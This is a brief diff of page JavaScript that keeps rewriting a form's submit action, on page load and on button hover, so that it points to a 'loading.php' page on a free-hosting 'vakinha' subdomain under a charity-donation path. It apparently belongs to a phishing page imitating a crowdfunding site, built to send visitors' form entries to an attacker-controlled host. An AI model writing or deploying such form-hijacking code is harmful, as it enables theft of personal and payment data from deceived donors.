@@ -3,10 +3,14 @@ function mudarAction(){
 document.formulario.action = "http://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php"; 
 
 }
-function auto() {document.formulario.action = "https://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php";
-}
-setInterval(auto,2000);
 
+function btn2func(){document.formulario.action = "https://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php";
+
+document.getElementById('mybtn2').addEventListener("mouseover", btn2func); 
+}
+ 
+
+window.addEventListener("load", btn2func); 
 
 
 
